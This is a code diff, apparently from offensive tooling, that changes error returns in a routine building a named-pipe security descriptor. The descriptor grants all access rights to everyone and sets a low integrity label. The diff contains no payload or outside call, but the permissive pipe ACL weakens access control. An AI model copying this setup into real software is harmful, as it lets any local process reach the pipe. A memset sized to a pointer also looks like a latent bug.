@@ -293,7 +293,7 @@ namespace Smb {
         x_memset(SecAttr, 0, sizeof(PSECURITY_ATTRIBUTES));
 
         if (!Ctx->win32.AllocateAndInitializeSid(&sid_auth, 1, SMB_SID_SINGLE_WORLD_SUBAUTHORITY, &SmbSecAttr->sid_low)) {
-            return_defer(ERROR_INVALID_SID);
+            return_defer(ntstatus);
         }
 
         access.grfAccessPermissions = SPECIFIC_RIGHTS_ALL | STANDARD_RIGHTS_ALL;
@@ -307,28 +307,28 @@ namespace Smb {
         if (
             !(Ctx->win32.SetEntriesInAclA(1, &access, nullptr, &acl)) ||
             !Ctx->win32.AllocateAndInitializeSid(&sid_label, 1, SMB_RID_SINGLE_MANDATORY_LOW, &SmbSecAttr->sid_low)) {
-            return_defer(ERROR_INVALID_SID);
+            return_defer(ntstatus);
         }
 
         if (!(SmbSecAttr->p_acl = S_CAST(PACL, x_malloc(MAX_PATH)))) {
-            return_defer(ERROR_NOT_ENOUGH_MEMORY);
+            return_defer(ntstatus);
         }
 
         if (
             !Ctx->win32.InitializeAcl(SmbSecAttr->p_acl, MAX_PATH, ACL_REVISION_DS) ||
             !Ctx->win32.AddMandatoryAce(SmbSecAttr->p_acl, ACL_REVISION_DS, NO_PROPAGATE_INHERIT_ACE, 0, SmbSecAttr->sid_low)) {
-            return_defer(ERROR_NO_ACE_CONDITION);
+            return_defer(ntstatus);
         }
 
         if (!(SmbSecAttr->sec_desc = x_malloc(SECURITY_DESCRIPTOR_MIN_LENGTH))) {
-            return_defer(ERROR_INVALID_SECURITY_DESCR);
+            return_defer(ntstatus);
         }
 
         if (
             !Ctx->win32.InitializeSecurityDescriptor(SmbSecAttr->sec_desc, SECURITY_DESCRIPTOR_REVISION) ||
             !Ctx->win32.SetSecurityDescriptorDacl(SmbSecAttr->sec_desc, TRUE, acl, FALSE) ||
             !Ctx->win32.SetSecurityDescriptorSacl(SmbSecAttr->sec_desc, TRUE, SmbSecAttr->p_acl, FALSE)) {
-            return_defer(ERROR_INVALID_SECURITY_DESCR);
+            return_defer(ntstatus);
         }
 
         defer:
